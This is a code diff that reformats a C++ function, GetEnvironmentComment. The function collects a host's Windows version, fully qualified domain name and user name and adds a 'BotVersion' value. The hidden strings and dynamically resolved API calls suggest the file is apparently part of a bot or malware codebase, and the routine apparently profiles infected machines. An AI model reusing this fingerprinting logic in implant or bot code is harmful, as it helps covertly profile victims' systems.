@@ -1,8 +1,8 @@
-#include "info.h"
-#include "main.h"
-#include "core\version.h"
+#include "../../core/include/core/memory.h"
+#include "../../core/include/core/version.h"
+#include "../../core/include/core/string.h"
 
-void GetEnvironmentComment( StringBuilder& s )
+void GetEnvironmentComment(StringBuilder& s)
 {
 	StringBuilderStack<256> buf;
 	GetNTVersion(buf);
@@ -10,14 +10,14 @@ void GetEnvironmentComment( StringBuilder& s )
 	s += buf;
 	s += _CS_(", Domain: ");
 	DWORD size = buf.Size();
-	if( API(KERNEL32, GetComputerNameExA)( ComputerNameDnsFullyQualified, buf.c_str(), &size ) )
+	if (API(KERNEL32, GetComputerNameExA)(ComputerNameDnsFullyQualified, buf.c_str(), &size))
 	{
 		buf.SetLen(size);
 		s += buf;
 	}
 	s += _CS_(", User: ");
 	size = buf.Size();
-	if( API(ADVAPI32, GetUserNameA)( buf.c_str(), &size ) )
+	if (API(ADVAPI32, GetUserNameA)(buf.c_str(), &size))
 	{
 		buf.SetLen(size - 1);
 		s += buf;
@@ -26,9 +26,9 @@ void GetEnvironmentComment( StringBuilder& s )
 	s += DECODE_STRING(Config::BotVersion);
 }
 
-int GetEnvironmentComment( char* s, int sz_s )
+int GetEnvironmentComment(char* s, int sz_s)
 {
-	StringBuilder s2( s, sz_s );
+	StringBuilder s2(s, sz_s);
 	GetEnvironmentComment(s2);
 	return s2.Len();
 }
